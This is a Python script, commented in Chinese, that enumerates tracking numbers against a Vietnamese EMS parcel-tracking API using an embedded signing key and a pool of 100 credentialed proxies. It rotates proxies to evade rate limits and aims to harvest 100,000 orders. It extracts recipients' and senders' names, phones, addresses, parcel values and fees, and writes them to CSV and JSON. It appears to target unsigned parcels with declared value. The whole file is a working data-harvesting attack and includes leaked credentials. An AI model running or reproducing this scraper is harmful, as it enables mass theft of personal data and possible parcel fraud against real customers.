#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
10万订单版本 - 代理池加速版
预估：15-30分钟找到100,000个
配置：100代理 × 多线程 = 超高速！
速度：~500-1000次/秒（提升10倍+）
"""

import hashlib
import requests
import json
import time
import csv
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import os
from datetime import datetime
import random

PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"

# 100个代理池
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
    "104.239.40.211:6830:uadkcvtn:uo2rzar814ph",
    "67.227.37.26:5568:uadkcvtn:uo2rzar814ph",
    "108.165.218.84:5823:uadkcvtn:uo2rzar814ph",
    "109.196.160.242:5988:uadkcvtn:uo2rzar814ph",
    "104.238.38.204:6472:uadkcvtn:uo2rzar814ph",
    "140.99.203.108:5985:uadkcvtn:uo2rzar814ph",
    "82.25.224.37:7848:uadkcvtn:uo2rzar814ph",
    "216.74.118.50:6205:uadkcvtn:uo2rzar814ph",
    "104.239.13.199:6828:uadkcvtn:uo2rzar814ph",
    "161.123.152.216:6461:uadkcvtn:uo2rzar814ph",
    "185.72.240.218:7254:uadkcvtn:uo2rzar814ph",
    "104.239.43.88:5816:uadkcvtn:uo2rzar814ph",
    "92.113.115.48:5995:uadkcvtn:uo2rzar814ph",
    "145.223.44.64:5747:uadkcvtn:uo2rzar814ph",
    "155.254.34.216:6196:uadkcvtn:uo2rzar814ph",
    "166.88.169.112:6719:uadkcvtn:uo2rzar814ph",
    "82.23.223.60:7904:uadkcvtn:uo2rzar814ph",
    "166.88.235.140:5768:uadkcvtn:uo2rzar814ph",
    "23.129.252.17:6285:uadkcvtn:uo2rzar814ph",
    "46.203.134.90:5714:uadkcvtn:uo2rzar814ph",
    "82.23.227.49:7352:uadkcvtn:uo2rzar814ph",
    "104.239.13.114:6743:uadkcvtn:uo2rzar814ph",
    "50.114.98.129:5613:uadkcvtn:uo2rzar814ph",
    "154.6.83.144:6615:uadkcvtn:uo2rzar814ph",
    "45.38.86.229:6158:uadkcvtn:uo2rzar814ph",
    "64.137.73.19:5107:uadkcvtn:uo2rzar814ph",
    "45.131.101.19:6286:uadkcvtn:uo2rzar814ph",
    "104.239.40.197:6816:uadkcvtn:uo2rzar814ph",
    "82.21.209.226:6555:uadkcvtn:uo2rzar814ph",
    "23.26.71.157:5640:uadkcvtn:uo2rzar814ph",
    "23.27.91.75:6154:uadkcvtn:uo2rzar814ph",
    "23.95.150.72:6041:uadkcvtn:uo2rzar814ph",
    "82.26.218.128:6436:uadkcvtn:uo2rzar814ph",
    "91.223.126.118:6730:uadkcvtn:uo2rzar814ph",
    "145.223.44.177:5860:uadkcvtn:uo2rzar814ph",
    "45.38.94.42:5963:uadkcvtn:uo2rzar814ph",
    "23.26.95.215:5697:uadkcvtn:uo2rzar814ph",
    "50.114.15.8:5993:uadkcvtn:uo2rzar814ph",
    "82.24.217.113:5443:uadkcvtn:uo2rzar814ph",
    "136.0.109.46:6332:uadkcvtn:uo2rzar814ph",
    "185.101.253.194:5754:uadkcvtn:uo2rzar814ph",
    "38.153.133.31:9435:uadkcvtn:uo2rzar814ph",
    "108.165.161.42:5783:uadkcvtn:uo2rzar814ph",
    "2.57.31.80:6656:uadkcvtn:uo2rzar814ph",
    "45.56.173.242:6225:uadkcvtn:uo2rzar814ph",
    "216.173.104.22:6159:uadkcvtn:uo2rzar814ph",
    "216.173.123.97:6472:uadkcvtn:uo2rzar814ph",
    "104.253.55.119:5549:uadkcvtn:uo2rzar814ph",
    "91.211.87.2:6992:uadkcvtn:uo2rzar814ph",
    "142.111.44.203:5915:uadkcvtn:uo2rzar814ph",
    "191.101.174.88:6136:uadkcvtn:uo2rzar814ph",
    "31.58.26.144:6727:uadkcvtn:uo2rzar814ph",
    "104.232.211.81:5694:uadkcvtn:uo2rzar814ph",
    "104.253.48.76:5500:uadkcvtn:uo2rzar814ph",
    "154.36.85.89:6600:uadkcvtn:uo2rzar814ph",
    "140.99.202.10:5888:uadkcvtn:uo2rzar814ph",
    "45.41.169.227:6888:uadkcvtn:uo2rzar814ph",
    "45.67.0.158:6594:uadkcvtn:uo2rzar814ph",
    "45.150.176.51:5924:uadkcvtn:uo2rzar814ph",
    "104.238.7.43:5970:uadkcvtn:uo2rzar814ph",
    "216.173.75.47:6348:uadkcvtn:uo2rzar814ph",
    "45.39.5.58:6496:uadkcvtn:uo2rzar814ph",
    "46.203.157.176:7119:uadkcvtn:uo2rzar814ph",
    "104.233.20.17:6033:uadkcvtn:uo2rzar814ph",
    "216.74.114.235:6518:uadkcvtn:uo2rzar814ph",
    "142.202.254.167:6145:uadkcvtn:uo2rzar814ph",
    "37.44.219.236:6201:uadkcvtn:uo2rzar814ph",
    "82.24.239.176:7033:uadkcvtn:uo2rzar814ph",
    "104.239.19.194:6871:uadkcvtn:uo2rzar814ph",
    "191.101.181.187:6940:uadkcvtn:uo2rzar814ph",
    "38.154.199.233:5387:uadkcvtn:uo2rzar814ph",
    "45.39.18.128:6564:uadkcvtn:uo2rzar814ph",
    "103.47.53.151:8449:uadkcvtn:uo2rzar814ph",
    "45.39.17.119:5542:uadkcvtn:uo2rzar814ph",
    "216.173.75.226:6527:uadkcvtn:uo2rzar814ph",
    "45.56.175.4:5678:uadkcvtn:uo2rzar814ph",
    "64.137.89.84:6157:uadkcvtn:uo2rzar814ph",
    "82.21.248.115:6451:uadkcvtn:uo2rzar814ph",
    "198.46.241.44:6579:uadkcvtn:uo2rzar814ph",
    "45.83.57.20:6537:uadkcvtn:uo2rzar814ph",
    "104.239.41.168:6523:uadkcvtn:uo2rzar814ph",
    "64.137.77.92:5527:uadkcvtn:uo2rzar814ph",
    "104.253.82.58:6479:uadkcvtn:uo2rzar814ph",
    "82.23.223.166:8010:uadkcvtn:uo2rzar814ph",
    "185.15.178.90:5774:uadkcvtn:uo2rzar814ph",
    "209.127.191.113:5187:uadkcvtn:uo2rzar814ph",
    "191.101.174.78:6126:uadkcvtn:uo2rzar814ph",
    "217.69.127.152:6773:uadkcvtn:uo2rzar814ph",
    "38.225.2.55:5838:uadkcvtn:uo2rzar814ph",
    "92.112.136.179:6123:uadkcvtn:uo2rzar814ph",
]

CONFIG = {
    'target': 100000,
    'threads_per_proxy': 1,  # 每个代理1个线程
    'total_threads': 70,  # 70线程（确保5-8小时完成10万）
    'delay': 0.25,  # 延迟0.25秒（平衡速度和安全）
    'timeout': 10,
    'save_every': 100,
    'max_98_retries': 10,  # Code:98最大重试次数
    'proxy_fail_threshold': 2,  # 失败2次就禁用
    'progress_file': 'progress_100k_proxy.json',
    'csv_file': 'orders_100k_proxy.csv',
    'json_file': 'orders_100k_proxy.json',
}

# 基于真实1200+订单数据分析的密集区域（完整版）
DENSE_REGIONS = [
    # EB 区域（12个密集区）
    {'prefix': 'EB', 'start': 102885483, 'end': 102885510, 'priority': 1, 'step': 1, 'name': 'EB_102885483'},
    {'prefix': 'EB', 'start': 102885846, 'end': 102885894, 'priority': 1, 'step': 1, 'name': 'EB_102885846'},
    {'prefix': 'EB', 'start': 102888365, 'end': 102888431, 'priority': 1, 'step': 1, 'name': 'EB_102888365'},
    {'prefix': 'EB', 'start': 102890228, 'end': 102890245, 'priority': 1, 'step': 1, 'name': 'EB_102890228'},
    {'prefix': 'EB', 'start': 102890347, 'end': 102890364, 'priority': 1, 'step': 1, 'name': 'EB_102890347'},
    {'prefix': 'EB', 'start': 102964844, 'end': 102964929, 'priority': 1, 'step': 1, 'name': 'EB_102964844'},
    {'prefix': 'EB', 'start': 102966160, 'end': 102966173, 'priority': 1, 'step': 1, 'name': 'EB_102966160'},
    {'prefix': 'EB', 'start': 102966448, 'end': 102966553, 'priority': 1, 'step': 1, 'name': 'EB_102966448'},
    {'prefix': 'EB', 'start': 102967647, 'end': 102967678, 'priority': 1, 'step': 1, 'name': 'EB_102967647'},
    {'prefix': 'EB', 'start': 102967899, 'end': 102968130, 'priority': 1, 'step': 1, 'name': 'EB_102967899'},
    {'prefix': 'EB', 'start': 102968735, 'end': 102968951, 'priority': 1, 'step': 1, 'name': 'EB_102968735'},
    {'prefix': 'EB', 'start': 102969064, 'end': 102969325, 'priority': 1, 'step': 1, 'name': 'EB_102969064'},
    
    # EC 区域（超密集！密度8.6%）
    {'prefix': 'EC', 'start': 149780335, 'end': 149780809, 'priority': 1, 'step': 1, 'name': 'EC_149780335'},
    
    # ED 区域
    {'prefix': 'ED', 'start': 121962191, 'end': 121962245, 'priority': 1, 'step': 1, 'name': 'ED_121962191'},
    
    # EF 区域（41个密集区 - 78.5%占比！）
    {'prefix': 'EF', 'start': 43571075, 'end': 43571226, 'priority': 1, 'step': 1, 'name': 'EF_43571075'},
    {'prefix': 'EF', 'start': 43571345, 'end': 43571359, 'priority': 1, 'step': 1, 'name': 'EF_43571345'},
    {'prefix': 'EF', 'start': 43571495, 'end': 43572972, 'priority': 1, 'step': 2, 'name': 'EF_43571495'},
    {'prefix': 'EF', 'start': 43573139, 'end': 43574647, 'priority': 1, 'step': 2, 'name': 'EF_43573139'},
    {'prefix': 'EF', 'start': 43574749, 'end': 43574871, 'priority': 1, 'step': 1, 'name': 'EF_43574749'},
    {'prefix': 'EF', 'start': 43574987, 'end': 43576271, 'priority': 1, 'step': 2, 'name': 'EF_43574987'},
    {'prefix': 'EF', 'start': 43579295, 'end': 43581237, 'priority': 1, 'step': 2, 'name': 'EF_43579295'},
    {'prefix': 'EF', 'start': 43581719, 'end': 43582396, 'priority': 1, 'step': 1, 'name': 'EF_43581719'},
    {'prefix': 'EF', 'start': 43590790, 'end': 43590891, 'priority': 1, 'step': 1, 'name': 'EF_43590790'},
    {'prefix': 'EF', 'start': 43591013, 'end': 43591441, 'priority': 1, 'step': 1, 'name': 'EF_43591013'},
    {'prefix': 'EF', 'start': 43591557, 'end': 43591680, 'priority': 1, 'step': 1, 'name': 'EF_43591557'},
    {'prefix': 'EF', 'start': 43592040, 'end': 43592288, 'priority': 1, 'step': 1, 'name': 'EF_43592040'},
    {'prefix': 'EF', 'start': 43592711, 'end': 43592994, 'priority': 1, 'step': 1, 'name': 'EF_43592711'},
    {'prefix': 'EF', 'start': 43593147, 'end': 43593266, 'priority': 1, 'step': 1, 'name': 'EF_43593147'},
    {'prefix': 'EF', 'start': 43593425, 'end': 43593544, 'priority': 1, 'step': 1, 'name': 'EF_43593425'},
    {'prefix': 'EF', 'start': 43593663, 'end': 43594479, 'priority': 1, 'step': 1, 'name': 'EF_43593663'},
    {'prefix': 'EF', 'start': 43594690, 'end': 43595085, 'priority': 1, 'step': 1, 'name': 'EF_43594690'},
    {'prefix': 'EF', 'start': 43595528, 'end': 43595735, 'priority': 1, 'step': 1, 'name': 'EF_43595528'},
    {'prefix': 'EF', 'start': 45405059, 'end': 45405093, 'priority': 1, 'step': 1, 'name': 'EF_45405059'},
    {'prefix': 'EF', 'start': 45746336, 'end': 45746469, 'priority': 1, 'step': 1, 'name': 'EF_45746336'},
    {'prefix': 'EF', 'start': 47519990, 'end': 47520193, 'priority': 1, 'step': 1, 'name': 'EF_47519990'},
    {'prefix': 'EF', 'start': 47520304, 'end': 47523345, 'priority': 1, 'step': 2, 'name': 'EF_47520304'},
    {'prefix': 'EF', 'start': 47544901, 'end': 47544963, 'priority': 1, 'step': 1, 'name': 'EF_47544901'},
    {'prefix': 'EF', 'start': 47549753, 'end': 47549767, 'priority': 1, 'step': 1, 'name': 'EF_47549753'},
    {'prefix': 'EF', 'start': 47549872, 'end': 47550116, 'priority': 1, 'step': 1, 'name': 'EF_47549872'},
    {'prefix': 'EF', 'start': 47550270, 'end': 47550703, 'priority': 1, 'step': 1, 'name': 'EF_47550270'},
    {'prefix': 'EF', 'start': 47551195, 'end': 47551981, 'priority': 1, 'step': 1, 'name': 'EF_47551195'},
    {'prefix': 'EF', 'start': 47552117, 'end': 47553470, 'priority': 1, 'step': 2, 'name': 'EF_47552117'},
    {'prefix': 'EF', 'start': 47553585, 'end': 47554387, 'priority': 1, 'step': 1, 'name': 'EF_47553585'},
    {'prefix': 'EF', 'start': 47554696, 'end': 47555524, 'priority': 1, 'step': 1, 'name': 'EF_47554696'},
    {'prefix': 'EF', 'start': 47555665, 'end': 47556860, 'priority': 1, 'step': 2, 'name': 'EF_47555665'},
    {'prefix': 'EF', 'start': 47557009, 'end': 47557176, 'priority': 1, 'step': 1, 'name': 'EF_47557009'},
    {'prefix': 'EF', 'start': 47681054, 'end': 47681955, 'priority': 1, 'step': 1, 'name': 'EF_47681054'},
    {'prefix': 'EF', 'start': 47682077, 'end': 47682298, 'priority': 1, 'step': 1, 'name': 'EF_47682077'},
    {'prefix': 'EF', 'start': 47682409, 'end': 47683316, 'priority': 1, 'step': 1, 'name': 'EF_47682409'},
    {'prefix': 'EF', 'start': 47683452, 'end': 47683761, 'priority': 1, 'step': 1, 'name': 'EF_47683452'},
    {'prefix': 'EF', 'start': 47683979, 'end': 47683996, 'priority': 1, 'step': 1, 'name': 'EF_47683979'},
    {'prefix': 'EF', 'start': 47684104, 'end': 47684206, 'priority': 1, 'step': 1, 'name': 'EF_47684104'},
    {'prefix': 'EF', 'start': 47684435, 'end': 47684988, 'priority': 1, 'step': 1, 'name': 'EF_47684435'},
    {'prefix': 'EF', 'start': 47685334, 'end': 47685970, 'priority': 1, 'step': 1, 'name': 'EF_47685334'},
    {'prefix': 'EF', 'start': 47747087, 'end': 47747334, 'priority': 1, 'step': 1, 'name': 'EF_47747087'},
    
    # EG 区域（6个密集区）
    {'prefix': 'EG', 'start': 40816534, 'end': 40816548, 'priority': 1, 'step': 1, 'name': 'EG_40816534'},
    {'prefix': 'EG', 'start': 40836088, 'end': 40836105, 'priority': 1, 'step': 1, 'name': 'EG_40836088'},
    {'prefix': 'EG', 'start': 40840745, 'end': 40840989, 'priority': 1, 'step': 1, 'name': 'EG_40840745'},
    {'prefix': 'EG', 'start': 46007274, 'end': 46007288, 'priority': 1, 'step': 1, 'name': 'EG_46007274'},
    {'prefix': 'EG', 'start': 46007402, 'end': 46007504, 'priority': 1, 'step': 1, 'name': 'EG_46007402'},
    {'prefix': 'EG', 'start': 47361262, 'end': 47361302, 'priority': 1, 'step': 1, 'name': 'EG_47361262'},
    
    # EJ 区域（9个密集区）
    {'prefix': 'EJ', 'start': 701441771, 'end': 701441927, 'priority': 1, 'step': 1, 'name': 'EJ_701441771'},
    {'prefix': 'EJ', 'start': 701442370, 'end': 701442423, 'priority': 1, 'step': 1, 'name': 'EJ_701442370'},
    {'prefix': 'EJ', 'start': 701442763, 'end': 701442777, 'priority': 1, 'step': 1, 'name': 'EJ_701442763'},
    {'prefix': 'EJ', 'start': 701443171, 'end': 701443225, 'priority': 1, 'step': 1, 'name': 'EJ_701443171'},
    {'prefix': 'EJ', 'start': 701443375, 'end': 701443494, 'priority': 1, 'step': 1, 'name': 'EJ_701443375'},
    {'prefix': 'EJ', 'start': 701443675, 'end': 701443843, 'priority': 1, 'step': 1, 'name': 'EJ_701443675'},
    {'prefix': 'EJ', 'start': 711462436, 'end': 711462541, 'priority': 1, 'step': 1, 'name': 'EJ_711462436'},
    {'prefix': 'EJ', 'start': 711462643, 'end': 711462816, 'priority': 1, 'step': 1, 'name': 'EJ_711462643'},
    {'prefix': 'EJ', 'start': 711463365, 'end': 711463431, 'priority': 1, 'step': 1, 'name': 'EJ_711463365'},
    
    # EK 区域（4个密集区）
    {'prefix': 'EK', 'start': 42151562, 'end': 42151580, 'priority': 1, 'step': 1, 'name': 'EK_42151562'},
    {'prefix': 'EK', 'start': 42227544, 'end': 42227663, 'priority': 1, 'step': 1, 'name': 'EK_42227544'},
    {'prefix': 'EK', 'start': 42227822, 'end': 42227924, 'priority': 1, 'step': 1, 'name': 'EK_42227822'},
    {'prefix': 'EK', 'start': 42228142, 'end': 42228227, 'priority': 1, 'step': 1, 'name': 'EK_42228142'},
    
    # EL 区域（3个密集区）
    {'prefix': 'EL', 'start': 135248060, 'end': 135248100, 'priority': 1, 'step': 1, 'name': 'EL_135248060'},
    {'prefix': 'EL', 'start': 135756433, 'end': 135756504, 'priority': 1, 'step': 1, 'name': 'EL_135756433'},
    {'prefix': 'EL', 'start': 155309426, 'end': 155309491, 'priority': 1, 'step': 1, 'name': 'EL_155309426'},
]

TYPE_NAMES = {
    'EF': 'EF类型', 'EJ': 'EJ类型', 'EK': 'EK类型', 'EL': 'EL类型', 'EB': 'EB类型',
    'EG': '国际品牌', 'EW': '电商包裹', 'EV': '国内标准', 'EI': 'EI类型', 'ED': 'ED类型', 
    'EE': 'EE类型', 'EC': 'COD代收', 'EP': '加急快递', 'EH': 'EH类型', 'EO': 'EO类型',
}

state = {
    'found': [],
    'tested': 0,
    'errors': 0,
    'rate_limited': 0,
    'lock': Lock(),
    'start_time': None,
    'last_print': None,
    'last_save': None,
    'proxy_stats': {proxy: {'success': 0, 'errors': 0, 'rate_limited': 0} for proxy in PROXIES},
}

class ProxyPool:
    """智能代理池 - 支持失败禁用"""
    def __init__(self, proxies):
        self.proxies = []
        self.failed_count = {}  # 失败计数
        
        for proxy_str in proxies:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
                proxy_url = f"http://{username}:{password}@{ip}:{port}"
                self.proxies.append({
                    'url': proxy_url,
                    'string': proxy_str,
                    'enabled': True,  # 是否启用
                    'dict': {
                        'http': proxy_url,
                        'https': proxy_url,
                    }
                })
                self.failed_count[proxy_str] = 0
        
        self.current_index = 0
        self.lock = Lock()
    
    def get_next_proxy(self):
        """轮询获取下一个可用代理"""
        with self.lock:
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxies)
                
                if proxy['enabled']:
                    return proxy
                
                attempts += 1
            
            # 如果所有代理都被禁用，返回第一个
            return self.proxies[0] if self.proxies else None
    
    def mark_failure(self, proxy_str):
        """标记代理失败 - 2次失败就禁用"""
        with self.lock:
            self.failed_count[proxy_str] = self.failed_count.get(proxy_str, 0) + 1
            
            if self.failed_count[proxy_str] >= CONFIG['proxy_fail_threshold']:
                # 禁用代理
                for proxy in self.proxies:
                    if proxy['string'] == proxy_str:
                        proxy['enabled'] = False
                        print(f"\n⚠️  代理 {proxy_str.split(':')[0]} 已禁用（失败{self.failed_count[proxy_str]}次）")
                        break
    
    def mark_success(self, proxy_str):
        """标记代理成功 - 重置失败计数"""
        with self.lock:
            self.failed_count[proxy_str] = 0

proxy_pool = ProxyPool(PROXIES)

def generate_signature(code):
    data = code.upper() + PRIVATE_KEY
    return hashlib.sha256(data.encode('utf-8')).hexdigest().upper()

def extract_phones_from_text(text):
    if not text:
        return []
    phones = re.findall(r'0\d{9,10}', str(text))
    phones = [p for p in phones if 10 <= len(p) <= 11]
    return list(set(phones))

def get_order_type(code):
    if not code or len(code) < 2:
        return '未知'
    prefix = code[:2].upper()
    return f"{prefix} - {TYPE_NAMES.get(prefix, '未知')}"

def extract_full_info(data):
    code = data.get('Code', '')
    
    api_fields = {
        '运单号': data.get('Code', ''),
        '订单ID': data.get('ID', ''),
        '收件人姓名': data.get('ReceiverName', ''),
        '收件人电话': data.get('ReceiverMobile', ''),
        '收件人地址': data.get('ReceiverAddress', ''),
        '实际收件人': data.get('RealReceiverName', ''),
        '寄件人姓名': data.get('SenderName', ''),
        '寄件人电话': data.get('SenderMobile', ''),
        '寄件人地址': data.get('SenderAddress', ''),
        '包裹价值(VND)': data.get('Value', 0) if data.get('Value') is not None else '',
        '运费(VND)': data.get('Fee', 0) if data.get('Fee') is not None else '',
        '签收信息': data.get('SignatureCapture', ''),
        '状态列表': str(data.get('ListStatus', [])),
    }
    
    receiver_phones = []
    receiver_name = data.get('ReceiverName', '')
    receiver_address = data.get('ReceiverAddress', '')
    receiver_mobile = data.get('ReceiverMobile', '')
    
    if receiver_mobile and receiver_mobile != '0':
        receiver_phones.extend(extract_phones_from_text(receiver_mobile))
    receiver_phones.extend(extract_phones_from_text(receiver_name))
    receiver_phones.extend(extract_phones_from_text(receiver_address))
    
    sender_phones = extract_phones_from_text(data.get('SenderAddress', ''))
    
    smart_fields = {
        '运单类型': get_order_type(code),
        '收件人电话_提取': ', '.join(receiver_phones) if receiver_phones else '',
        '寄件人电话_提取': ', '.join(sender_phones) if sender_phones else '',
        '是否已签收': '是' if data.get('SignatureCapture') else '否',
        '电话完整度': '完整' if receiver_phones or (receiver_mobile and receiver_mobile != '0') else '脱敏',
    }
    
    full_info = {**api_fields, **smart_fields}
    return full_info

def query_order(code, proxy=None):
    """查询订单 - 支持Code:98自动换代理重试"""
    url = "https://api-dingdong.ems.com.vn/api/TrackTrace/Lading"
    signature = generate_signature(code)
    payload = {'LadingCode': code.upper(), 'Signature': signature}
    
    # 自动选择代理
    if proxy is None:
        proxy = proxy_pool.get_next_proxy()
    
    # 重试逻辑 - 最多换10次代理
    for attempt in range(CONFIG['max_98_retries']):
        proxy_str = proxy['string']
        
        try:
            response = requests.post(
                url, 
                json=payload, 
                proxies=proxy['dict'],
                timeout=CONFIG['timeout']
            )
            result = response.json()
            
            code_val = result.get('Code', '')
            
            # 遇到Code:98 - 换代理重试
            if code_val == '98':
                print(f"98..", end='', flush=True)  # 显示98重试过程
                proxy_pool.mark_failure(proxy_str)  # 标记失败
                time.sleep(0.3)
                
                # 换下一个代理
                proxy = proxy_pool.get_next_proxy()
                if proxy is None:
                    with state['lock']:
                        state['rate_limited'] += 1
                    return {'status': 'no_proxy'}
                
                continue  # 重试
            
            # 成功
            if code_val == '00':
                proxy_pool.mark_success(proxy_str)  # 重置失败计数
                
                data = result.get('Value') or result.get('Data')
                if isinstance(data, str):
                    data = json.loads(data)
                
                if not data.get('SignatureCapture'):
                    try:
                        value = float(data.get('Value', 0)) if data.get('Value') else 0
                        fee = float(data.get('Fee', 0)) if data.get('Fee') else 0
                    except:
                        value = 0
                        fee = 0
                    
                    if value > 0 or fee > 0:
                        with state['lock']:
                            state['proxy_stats'][proxy_str]['success'] += 1
                        return {'status': 'found', 'data': data, 'proxy': proxy_str}
            
            # 其他情况也算成功（不是98）
            proxy_pool.mark_success(proxy_str)
            with state['lock']:
                state['proxy_stats'][proxy_str]['success'] += 1
            
        except Exception as e:
            with state['lock']:
                state['errors'] += 1
                state['proxy_stats'][proxy_str]['errors'] += 1
        
        return None
    
    # 重试10次都是98
    with state['lock']:
        state['rate_limited'] += 1
    return {'status': 'max_98_retry'}

def scan_dense_region(region):
    """扫描密集区域"""
    prefix = region['prefix']
    start = region['start']
    end = region['end']
    step = region['step']
    region_name = region['name']
    
    for num in range(end, start, -step):
        with state['lock']:
            if len(state['found']) >= CONFIG['target']:
                break
        
        code = f"{prefix}{num:09d}VN"
        result = query_order(code)
        
        with state['lock']:
            state['tested'] += 1
            
            if result and result.get('status') == 'found':
                data = result['data']
                state['found'].append(data)
                
                count = len(state['found'])
                value = data.get('Value', 0) or 0
                fee = data.get('Fee', 0) or 0
                receiver = data.get('ReceiverName', '')[:15]
                proxy_ip = result.get('proxy', '').split(':')[0]
                
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                eta = (CONFIG['target'] - count) / (count / elapsed) if count > 0 and elapsed > 0 else 0
                
                value_str = f"💰{value:,.0f}" if value > 0 else ""
                fee_str = f"📦{fee:,.0f}" if fee > 0 else ""
                info_str = f"{value_str} {fee_str}" if value_str or fee_str else "无申报"
                
                print(f"\n✅ [{count:6d}] {code} | {receiver:15s} | {info_str:18s} | {speed:.0f}/s | ETA:{eta/60:.0f}m | {proxy_ip}")
                
                current_time = time.time()
                if count % CONFIG['save_every'] == 0 or (state['last_save'] and current_time - state['last_save'] > 300):
                    save_progress()
                    state['last_save'] = current_time
            
            else:
                current_time = time.time()
                if state['last_print'] is None or current_time - state['last_print'] > 30:
                    state['last_print'] = current_time
                    elapsed = time.time() - state['start_time']
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    count = len(state['found'])
                    hit_rate = (count / state['tested'] * 100) if state['tested'] > 0 else 0
                    
                    print(f"\n🔍 [{count:6d}] 已测试:{state['tested']:,} | {speed:.0f}/s | 命中率:{hit_rate:.2f}% [{region_name}]")
        
        time.sleep(CONFIG['delay'])

def save_progress():
    if not state['found']:
        return
    
    full_data = [extract_full_info(item) for item in state['found']]
    
    progress = {
        'found': state['found'],
        'tested': state['tested'],
        'errors': state['errors'],
        'rate_limited': state['rate_limited'],
        'proxy_stats': state['proxy_stats'],
        'timestamp': datetime.now().isoformat(),
    }
    
    with open(CONFIG['progress_file'], 'w', encoding='utf-8') as f:
        json.dump(progress, f, indent=2, ensure_ascii=False)
    
    with open(CONFIG['json_file'], 'w', encoding='utf-8') as f:
        json.dump(state['found'], f, indent=2, ensure_ascii=False)
    
    if full_data:
        fieldnames = [
            '运单号', '订单ID', '运单类型',
            '收件人姓名', '收件人电话', '收件人电话_提取', '收件人地址', '实际收件人',
            '寄件人姓名', '寄件人电话', '寄件人电话_提取', '寄件人地址',
            '包裹价值(VND)', '运费(VND)',
            '是否已签收', '签收信息', '电话完整度', '状态列表',
        ]
        
        with open(CONFIG['csv_file'], 'w', encoding='utf-8-sig', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(full_data)
    
    print(f"   💾 已保存: {len(state['found']):,} 个")

def load_progress():
    if os.path.exists(CONFIG['progress_file']):
        try:
            with open(CONFIG['progress_file'], 'r', encoding='utf-8') as f:
                progress = json.load(f)
            
            state['found'] = progress['found']
            state['tested'] = progress['tested']
            state['errors'] = progress.get('errors', 0)
            state['rate_limited'] = progress.get('rate_limited', 0)
            
            if 'proxy_stats' in progress:
                state['proxy_stats'].update(progress['proxy_stats'])
            
            print(f"\n✅ 恢复进度: 已找到 {len(state['found']):,} 个 | 已测试 {state['tested']:,} 次")
            return True
        except:
            pass
    
    return False

def main():
    print("="*100)
    print("⚡⚡⚡ 10万订单版本 - 100代理池超高速版 ⚡⚡⚡")
    print("="*100)
    
    print(f"\n🚀 代理池配置:")
    print(f"  代理数量: {len(PROXIES)} 个")
    print(f"  失败阈值: {CONFIG['proxy_fail_threshold']} 次就禁用")
    print(f"  Code:98重试: 最多换{CONFIG['max_98_retries']}次代理")
    print(f"  总线程数: {CONFIG['total_threads']} 个")
    print(f"  延迟: {CONFIG['delay']} 秒")
    
    print(f"\n🎯 扫描区域: {len(DENSE_REGIONS)} 个（基于真实数据分析）")
    
    resumed = load_progress()
    
    if resumed and len(state['found']) >= CONFIG['target']:
        print(f"\n✅ 已完成！")
        return
    
    input("\n按 Enter 开始...\n")
    
    state['start_time'] = time.time()
    state['last_print'] = time.time()
    state['last_save'] = time.time()
    
    print(f"🔍 搜索中...\n")
    
    with ThreadPoolExecutor(max_workers=CONFIG['total_threads']) as executor:
        futures = []
        
        for priority in [1, 2]:
            for region in DENSE_REGIONS:
                if region['priority'] == priority:
                    future = executor.submit(scan_dense_region, region)
                    futures.append(future)
                    
                    if len(state['found']) >= CONFIG['target']:
                        break
            
            if len(state['found']) >= CONFIG['target']:
                break
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                pass
    
    save_progress()
    
    elapsed = time.time() - state['start_time']
    
    print("\n" + "="*100)
    print("📊 完成统计")
    print("="*100)
    
    print(f"\n✅ 找到: {len(state['found']):,} 个")
    print(f"📝 测试: {state['tested']:,} 次")
    print(f"⏱️  耗时: {elapsed/60:.1f} 分钟 ({elapsed/3600:.2f} 小时)")
    print(f"📈 速度: {state['tested']/elapsed:.0f} 次/秒")
    print(f"📈 命中率: {len(state['found'])/state['tested']*100:.2f}%")
    
    if state['errors'] > 0:
        print(f"⚠️  错误: {state['errors']} 次")
    if state['rate_limited'] > 0:
        print(f"⚠️  限流: {state['rate_limited']} 次")
    
    print(f"\n✅ 输出文件:")
    print(f"  📄 CSV: {CONFIG['csv_file']}")
    print(f"  📄 JSON: {CONFIG['json_file']}")
    
    print("\n" + "="*100)
    print("🎉 完成！")
    print("="*100)

if __name__ == '__main__':
    main()
